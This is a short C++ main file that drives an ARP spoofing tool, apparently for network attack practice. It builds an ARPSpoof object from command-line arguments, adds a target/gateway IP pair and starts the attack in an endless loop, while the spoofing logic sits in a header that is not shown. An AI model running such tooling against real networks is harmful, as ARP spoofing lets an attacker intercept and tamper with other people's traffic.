#include "arp_spoof.h"

int main(int argc, char * argv[])
{
   
    ARPSpoof aa((uint8_t *)argv[1], (uint32_t)((argc -1)/2) );

    
    aa.AddAttackList((uint32_t)inet_addr(argv[2]), (uint32_t)inet_addr(argv[3]));
    aa.AttackStart();

    while(1);
 
}
